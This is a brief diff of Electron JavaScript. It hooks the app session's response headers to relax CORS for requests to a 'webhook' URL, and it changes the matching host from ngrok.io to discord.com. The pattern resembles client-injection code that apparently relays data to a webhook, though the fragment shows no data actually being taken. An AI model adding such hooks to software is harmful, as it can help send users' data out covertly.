@@ -29,7 +29,7 @@ const config = {
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 	if (details.url.startsWith(webhook)) {
-		if (details.url.includes("ngrok.io")) {
+		if (details.url.includes("discord.com")) {
 			callback({
 				responseHeaders: Object.assign({
 					'Access-Control-Allow-Headers': "*"
